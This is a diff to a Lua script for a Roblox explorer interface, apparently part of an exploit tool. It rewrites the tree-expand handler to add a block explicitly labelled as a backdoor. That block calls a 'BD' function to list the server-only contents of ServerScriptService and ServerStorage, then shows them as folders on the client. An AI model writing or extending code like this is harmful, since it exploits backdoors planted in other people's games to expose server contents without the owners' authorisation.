@@ -1555,15 +1555,32 @@ local function main()
 			end
 		end)
 
-		newEntry.Indent.Expand.MouseButton1Down:Connect(function()
-			local node = tree[index + Explorer.Index]
-			if not node or #node == 0 then return end
-
-			expanded[node] = not expanded[node]
-			Explorer.Update()
-			Explorer.Refresh()
-		end)
-
+newEntry.Indent.Expand.MouseButton1Down:Connect(function()
+    local node = tree[index + Explorer.Index]
+    if not node or #node == 0 then return end
+    
+    -- === BACKDOOR KOKO ===
+    if KOKO_BACKDOOR and node.Obj and node.Obj:IsA("ServiceProvider") then
+        local name = node.Obj.Name
+        if name == "ServerScriptService" or name == "ServerStorage" or name == "ServerReplicatedStorage" then
+            -- Charger les vrais enfants depuis le serveur
+            local result = BD("getchildren", name)
+            if result then
+                for line in result:gmatch("[^\n]+") do
+                    local cn, nm = line:match("^([^:]+):%s*(.+)$")
+                    if cn and nm and not node.Obj:FindFirstChild(nm) then
+                        local f = Instance.new("Folder"); f.Name = nm; f.Parent = node.Obj
+                    end
+                end
+            end
+        end
+    end
+    -- ====================
+    
+    expanded[node] = not expanded[node]
+    Explorer.Update()
+    Explorer.Refresh()
+end)
 		newEntry.Parent = treeFrame
 		return newEntry
 	end
